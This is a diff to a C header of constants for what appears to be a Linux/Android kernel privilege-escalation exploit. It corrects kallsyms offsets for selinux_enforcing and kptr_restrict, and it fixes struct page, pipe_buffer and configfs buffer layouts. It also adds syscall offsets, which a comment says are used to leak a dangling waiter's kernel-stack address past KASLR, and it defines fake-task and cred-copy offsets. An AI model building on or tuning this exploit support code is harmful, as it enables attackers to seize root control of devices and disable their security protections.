@@ -13,7 +13,7 @@
 #define KERNELSNITCH_IDENTITY_START 0xffffffc000000000ULL
 #define KERNELSNITCH_IDENTITY_END   0xffffffc400000000ULL
 #define DIRECT_MAP_BASE 0xffffffc000000000ULL
-#define DIRECT_MAP_END 0x0ULL
+#define DIRECT_MAP_END 0xffffffc400000000ULL
 #define VMEMMAP_START 0xffffffbf00000000ULL
 
 /* Global symbol offsets (kallsyms) */
@@ -22,7 +22,7 @@
 #define INIT_UTS_NS_OFF        0x029A9558ULL
 #define EMPTY_ZERO_PAGE_OFF    0x0220B000ULL
 #define ROOT_TASK_GROUP_OFF    0x02CE9E80ULL
-#define SELINUX_ENFORCING_OFF  0x02DC8CC8ULL
+#define SELINUX_ENFORCING_OFF  0x02DC8CE8ULL  /* global int selinux_enforcing (enforcing_enabled() reads this), NOT selinux_state@0x2DC8CC8 */
 #define KPTR_RESTRICT_OFF      0x029A92A8ULL
 #define CAP_CAPABLE_ACTIVE_OFF 0x00411DCCULL
 #define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
@@ -34,6 +34,9 @@
 #define SYSTEM_UNBOUND_WQ_OFF              0ULL
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF   0ULL
 #define CONFIGFS_READ_ITER_OFF      0x002BE7DCULL
+/* configfs_read_file (non-bin): skips to_frag() when needs_read_fill==0 */
+#define CONFIGFS_READ_FILE_OFF      0x002BE46CULL
+#define CONFIGFS_READ_FILE          (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)
 #define CONFIGFS_BIN_WRITE_ITER_OFF 0x002BE96CULL
 #define COPY_SPLICE_READ_OFF   0x0024F2D4ULL
 #define NOOP_LLSEEK_OFF        0x0020B474ULL
@@ -142,9 +145,9 @@
 #define PFA_NO_NEW_PRIVS_BIT      0
 
 #define STRUCT_PAGE_SIZE              0x40
-#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
-#define STRUCT_SLAB_CACHE_OFF         0x08
-#define STRUCT_PAGE_TYPE_OFF          0x30
+#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x20
+#define STRUCT_SLAB_CACHE_OFF         0x30
+#define STRUCT_PAGE_TYPE_OFF          0x18
 
 #define PIPE_BUFFER_SIZE         0x28
 #define PIPE_BUFFER_SLOTS        32
@@ -164,6 +167,14 @@
 #define PIPE_BUFS_OFF                 0xa8
 #define PIPE_USER_OFF                 0xb0
 
+/* Unslid image offsets of the misc syscalls we sample to leak the kernel-stack
+ * address of the dangling waiter (only the LOW 21 BITS matter: KASLR slides by a
+ * multiple of 2 MB).  From kallsyms of the device:
+ *   SyS_setsockopt  = 0xffffff8009428f54  -> 0x01428f54
+ *   sock_setsockopt = 0xffffff800942eafc  -> 0x0142eafc
+ * frames: SyS 0x50, sock_setsockopt 0x180  (disasm, BAN_GIAO §4). */
+#define SYS_SETSOCKOPT_OFF   0x01428f54ULL
+#define SOCK_SETSOCKOPT_OFF  0x0142eafcULL
 #define FOPS_OWNER_OFF        0x00
 #define FOPS_LLSEEK_OFF       0x10
 #define FOPS_READ_OFF         0x18
@@ -186,10 +197,10 @@
 #define LEFT_OFF      0x1260
 #define FAKE_TASK_OFF 0x1280
 #define CFG_PAGE_OFF            16
-#define CFG_NEEDS_READ_FILL_OFF 80
-#define CFG_BIN_BUFFER_OFF      88
-#define CFG_BIN_BUFFER_SIZE_OFF 96
-#define CFG_CB_MAX_SIZE_OFF     100
+#define CFG_NEEDS_READ_FILL_OFF            0x48
+#define CFG_BIN_BUFFER_OFF            0x50
+#define CFG_BIN_BUFFER_SIZE_OFF            0x58
+#define CFG_CB_MAX_SIZE_OFF            0x5c
 
 /* Write 2 specific */
 #define CRED_COPY_OFF 0x1080
